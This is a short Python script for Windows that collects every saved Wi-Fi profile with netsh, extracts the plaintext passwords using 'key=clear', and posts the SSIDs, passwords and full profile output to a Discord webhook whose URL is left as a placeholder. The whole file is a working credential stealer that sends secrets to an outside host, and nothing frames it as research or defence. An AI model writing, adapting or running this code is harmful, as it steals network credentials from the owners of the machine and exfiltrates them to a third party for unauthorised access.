import subprocess, requests, re, os
from concurrent.futures import ThreadPoolExecutor
if __name__ == "__main__":
    
    webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
    def send_webhook_message(content):
        requests.post(webhook_url, data={'content': content})
    def check_wireless_interface():
        try:
            result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True, check=True)
            return "There is no wireless interface on the system" not in result.stdout
        except subprocess.CalledProcessError:
            return False
    def get_profile_details(profile_name):
        try:
            result = subprocess.run(["netsh", "wlan", "show", "profile", profile_name.strip(), "key=clear"], capture_output=True, text=True, check=True)
            password = re.search(r'Key Content\s*:\s*(.*)', result.stdout)
            return f"**SSID:** {profile_name.strip()}\n**Password:** {password.group(1).strip() if password else 'No password found'}\n" \
                f"```{result.stdout.strip()}```"
        except subprocess.CalledProcessError:
            return None
    def get_wifi_profiles():
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, check=True).stdout)
        with ThreadPoolExecutor() as executor:
            wifi_credentials = list(executor.map(get_profile_details, profiles))
        wifi_credentials = [cred for cred in wifi_credentials if cred]
        if wifi_credentials:
            message = "@everyone 📡 **Wi-Fi Network Credentials Found!**\n" + "\n".join(wifi_credentials)
            send_webhook_message(message)
    def start():
        if os.name == 'nt':
            if check_wireless_interface():
                get_wifi_profiles()
            else:
                send_webhook_message('🚩 **No wireless interface on the system.**')
        else:
            send_webhook_message('🚩 **OS not supported.**')
    start()